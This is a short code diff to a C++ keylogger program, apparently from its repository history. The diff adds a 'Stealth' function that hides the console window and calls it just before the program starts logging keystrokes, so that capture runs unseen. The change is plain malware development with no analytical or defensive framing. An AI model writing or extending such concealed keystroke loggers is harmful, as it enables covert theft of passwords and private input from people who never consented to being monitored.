@@ -1,3 +1,4 @@
+#define _WIN32_WINNT 0x0500
 #include <iostream>
 
 #include "key_listener_exports.h"
@@ -5,6 +6,11 @@
 using namespace std;
 
 #define KEYLOGGER_DIR_INDEX (1)
+
+void Stealth()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+}
 
 int main(int argc, const char *argv[]) {
     eKLoggerStatus rc = UNDEFINED;
@@ -25,6 +31,11 @@ int main(int argc, const char *argv[]) {
         goto Exit;
     }
     cout << "Init Successfully" << endl;
+
+    /*
+     * Hide console window.
+     */
+    Stealth();
 
     rc = beginLogging();
     if (SUCCESS != rc) {
